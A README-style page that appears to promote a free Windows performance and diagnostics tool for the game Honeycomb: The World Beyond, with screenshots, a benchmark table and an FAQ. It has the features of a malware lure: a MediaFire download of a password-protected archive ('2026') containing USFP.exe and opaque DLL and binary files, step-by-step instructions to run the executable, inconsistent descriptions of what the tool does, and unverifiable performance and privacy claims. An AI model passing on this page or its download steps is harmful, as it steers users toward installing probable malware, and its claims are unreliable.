<div align="center">

# 🎮 Honeycomb: The World Beyond — Performance Notes

**Measure frame pacing, cache preparation, and recovery behavior.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Honeycomb: The World Beyond is a science-fiction survival sandbox set on the alien planet Sota7, combining exploration, crafting, base development, and bioengineering. Its Unreal Engine rendering workload makes consistent frame delivery, shader preparation, and stable streaming important during exploration and construction.

This tool is intended for Honeycomb: The World Beyond players diagnosing frame pacing, startup, cache, and session stability issues on Windows.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1510440/f1ef2b7ca6df9836440563558583ed736a6633b2/ss_f1ef2b7ca6df9836440563558583ed736a6633b2.1920x1080.jpg?t=1789039133" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1510440/99305133170ef7f7ae981a761593400541902125/ss_99305133170ef7f7ae981a761593400541902125.1920x1080.jpg?t=1789039133" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1510440/151e5cf09d0c37ef9f12860c81621d46a707f6c2/ss_151e5cf09d0c37ef9f12860c81621d46a707f6c2.1920x1080.jpg?t=1789039133" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig at 1920x1080 High settings, average frame rate falls to 34 FPS during dense outdoor exploration and base construction.
- On the stated test rig, 1% low performance drops to 14 FPS during rapid traversal and asset streaming.
- On the stated test rig, frame-time spikes above 50 ms occur 8 times during a 10-minute exploration route.
- On the stated test rig, initial shader preparation takes approximately 90 seconds before the first playable session.

## 🩺 How the toolkit addresses these issues

- **Low average frame rate during exploration and construction** → Frame Rate Helper adjusts frame delivery behavior to reduce scheduling variance, while Process Scheduling Helper optimizes process scheduling for the game session.
- **Low 1% lows during traversal and asset streaming** → Frame Timing Helper stabilizes frame delivery, and Startup Parameter Tool applies tuned startup parameters for the selected game profile.
- **Frame-time spikes above 50 ms** → Stability Report + Session Recovery collects diagnostic data and restores the session after an interruption, while Frame Timing Helper targets frame pacing irregularities.
- **Long shader preparation on launch** → Graphics Cache Utility manages graphics cache data to reduce redundant preparation on subsequent launches.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent output.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling during active game sessions.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and removes redundant cache entries.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores sessions after interruptions.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for the selected game profile.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and reduces frame-time variance.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- shader_cache.pak <- Shader cache data
|-- frame_data.pak <- Display sync data
|-- core.bin <- Core runtime
|-- config.cfg <- User configuration
|-- Password 2026.txt <- Password reminder (empty)
|-- crash_reader.dll <- Crash log reader
|-- fps_module.dll <- FPS module
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.